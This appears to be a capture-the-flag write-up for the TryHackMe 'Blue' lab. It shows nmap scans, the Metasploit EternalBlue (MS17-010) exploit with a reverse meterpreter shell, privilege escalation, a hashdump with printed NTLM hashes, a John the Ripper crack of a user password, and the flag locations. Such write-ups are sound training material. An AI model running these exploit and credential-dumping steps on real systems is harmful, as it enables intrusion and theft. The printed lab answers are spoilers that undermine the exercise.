# Blue @TryHackMe

Difficulty: EASY

Keywords and tools: nmap, metasploit, meterpreter, eternalblue, jtr

### Check that host is alive
```                                                                            
$ ping <target_ip>
PING 10.10.115.120 (10.10.115.120) 56(84) bytes of data.
64 bytes from 10.10.115.120: icmp_seq=1 ttl=127 time=47.9 ms
64 bytes from 10.10.115.120: icmp_seq=2 ttl=127 time=47.2 ms
```
### nmap scans
```
$nmap -sV -n -v -Pn -p- -T4 -A <target_ip>

Nmap scan report for 10.10.115.120
Host is up (0.067s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-01-24T08:13:10
| Not valid after:  2021-07-26T08:13:10
| MD5:   9bc0 8320 acb6 9971 8509 1080 9ea7 80b0
|_SHA-1: 2d85 8cb7 6509 2681 2b57 dc2f 4c9b 0b25 aaa8 4e09
|_ssl-date: 2021-01-25T08:16:34+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: -1s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:64:3c:d0:00:d1 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-25T02:16:28-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-25T08:16:28
|_  start_date: 2021-01-25T08:13:09



$nmap --script vuln <target_ip>

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```
Based on these results we see RDP port open and that host is vulnerable to ms17-010.

### Lets start metasploit and try to gain access.
```
$msfconsole
>search exploit windows ms17-010
>use exploit/windows/smb/ms17_010_eternalblue
>set rhosts <target_ip>
>set payload windows/meterpreter/reverse_tcp
>exploit
```
If you didn't set meterpreter payload, you can background the shell and use use post/multi/manage/shell_to_meterpreter.
Next lets  elevate our privileges and migrate to process.
```
>getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
>getuid
Server username: NT AUTHORITY\SYSTEM
>ps
>migrate 996
[*] Migrating from 1276 to 996...
[*] Migration completed successfully.
```

Dump the passwords and save them to a file.
```
> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
Use john the ripper to crack password.
```
$john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt test.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2021-01-25 06:34) 1.666g/s 17000Kp/s 17000Kc/s 17000KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```
Once we have the password and there is RDP port open, lets login in.
```
$rdclient <target_ip>
->login
->search for flags

Flag1 is in root (C:\flag1)
Flag2 is in C:\Windows\System32\config
Flag3 is in C:\Users\Jon\Documents
```


